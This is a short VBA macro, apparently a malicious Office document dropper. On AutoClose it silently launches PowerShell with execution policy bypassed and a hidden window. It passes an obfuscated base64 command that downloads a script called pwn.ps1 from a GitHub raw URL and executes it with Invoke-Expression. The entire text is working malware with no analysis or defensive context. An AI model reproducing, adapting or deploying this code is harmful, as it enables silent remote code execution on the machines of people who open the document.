Function payload() As Boolean
Dim p0 As String
Dim p1 As String
Dim p2 As String
Dim p3 As String
Dim p4 As String
Dim p5 As String
Dim p6 As String

p0="JAB3AGMAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7ACAAJAB1AHMAZQByAEEAZwBlAG4AdAAgAD0AIAAnAEAAdABmAGEAaQByAGEAbgBlACcAOwAgACQAdwBjAC4AaABlAGEAZABlAHIAcwAuAGEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAA"
p1="gACQAdQBzAGUAcgBBAGcAZQBuAHQAKQA7ACAAJAB3AGMALgBwAHIAbwB4AHkAIAA9ACAAWwBzAHkAcwB0AGUAbQAuAG4AZQB0AC4AdwBlAGIAcgBlAHEAdQBlAHMAdABdADoAOgBkAGUAZgBhAHUAbAB0AHcAZQBiAHAAcgBvAHgAeQA7ACAAJAB3AGMALgBwAHIAbwB4AHkALgBjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAAWwBzAH"
p2="kAcwB0AGUAbQAuAG4AZQB0AC4AYwByAGUAZABlAG4AdABpAGEAbABjAGEAYwBoAGUAXQA6ADoAZABlAGYAYQB1AGwAdABuAGUAdAB3AG8AcgBrAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7ACAAIAB3AGgAaQBsAGUAKAB7ACAAIAAgACgAJABzAHUAYgApACAAPQAgACgAIgB0AGYAIgAsACIAYQBpACIALAAiAHIAYQAiACwAIgBuAGUAI"
p3="gApADsAIAAgACAAZgBvAHIAKAAoACQAaQAsACAAJABzAHQAcgApACAAPQAgACgAMAAsACAAJwAnACkAOwAgACQAaQAgAC0AbAB0ACAAJABzAHUAYgAuAEwAZQBuAGcAdABoADsAIAAkAGkAKwArACkAIAB7ACAAIAAgACAAIAAkAHMAdAByACAAKwA9ACAAJABzAHUAYgBbACgARwBlAHQALQBSAGEAbgBkAG8AbQAgAC0AbQBhAHgAaQBt"
p4="AHUAbQAgACQAcwB1AGIALgBMAGUAbgBnAHQAaAApAF0AOwAgACAAIAB9ACAAIAAgACQAcwBjACAAPQAgACIAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwAiACAAKwAgACQAcwB0AHIAIAArACAAIgAvAEQAbwBjAEQAcgBvAHAAcABlAHIALwBtAGEAcwB0AGU"
p5="AcgAvAHMAdAB1AGIALwBwAHcAbgAuAHAAcwAxACIAOwAgACAAIAB0AHIAeQAgAHsAIAAgACAAIAAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAoACQAdwBjAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJABzAGMAKQApADsAIAAgACAAIAAgAGIAcgBlAGEAawA7ACAAIAAgAH0AIABjAGEAdABjAGgAew"
p6="AgAHIAZQB0AHUAcgBuACAAJAB0AHIAdQBlADsAIAB9ACAAfQAuAGkAbgB2AG8AawBlACgAKQApAHsAfQA="

Shell ("powershell.exe -ExecutionPolicy Bypass -WindowStyle hidden -encodedCommand " + p0 + p1 + p2 + p3 + p4 + p5 + p6)
End Function

Public Sub AutoClose()
    payload
End Sub
